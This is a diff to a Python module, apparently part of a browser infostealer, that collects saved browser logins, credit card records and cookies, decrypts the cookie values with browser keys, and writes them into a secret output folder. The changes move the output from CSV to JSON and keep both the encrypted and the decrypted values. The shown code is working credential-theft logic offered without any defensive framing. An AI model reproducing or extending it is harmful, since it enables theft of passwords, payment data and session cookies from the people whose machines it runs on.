@@ -174,7 +174,7 @@ class Broswer:
         if self.logins:
             for login in self.logins:
                 content_type = login["content_type"] + "_"
-                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".csv"
+                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
                 browser_path = secret_output / login["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
@@ -187,7 +187,7 @@ class Broswer:
         if self.credit_cards:
             for credit_card in self.credit_cards:
                 content_type = credit_card["content_type"] + "_"
-                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".csv"
+                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
                 browser_path = secret_output / credit_card["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
@@ -200,7 +200,7 @@ class Broswer:
         if self.cookies:
             for cookie in self.cookies:
                 content_type = cookie["content_type"] + "_"
-                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".csv"
+                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
                 browser_path = secret_output / cookie["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
@@ -264,18 +264,16 @@ class Broswer:
                             try:
                                 if data["encrypted_value"]:
                                     data["value"] = self.decrypter(data["encrypted_value"], decrypt_key)
-                                    data.pop("encrypted_value")
                             except Exception as e:
                                 print(f"[-] Error decrypting cookies: {e}")        
                 else:
                     print(f"[-] browser_name= {browser_name} is not in  self.decrypt_keys={self.decrypt_keys}")
 
 
-def convert_bytes_to_utf8(data):
+def convert_bytes_to_str(data):
     def convert(value):
         if isinstance(value, bytes):
-            # Используем 'replace' для замены недопустимых байтов
-            return value.decode('utf-8', errors='replace')
+            return value.hex()  # Возвращаем строковое hex представление байтов
         return value
 
     def traverse_and_convert(d):
@@ -293,7 +291,7 @@ def convert_bytes_to_utf8(data):
 def write_dict_to_json(filename, dict_data):
     if dict_data:
         # Преобразование всех полей типа bytes
-        dict_data = convert_bytes_to_utf8(dict_data)
+        dict_data = convert_bytes_to_str(dict_data)
 
         print_debug(f"Writing {filename}")
         with open(filename, "w") as f:
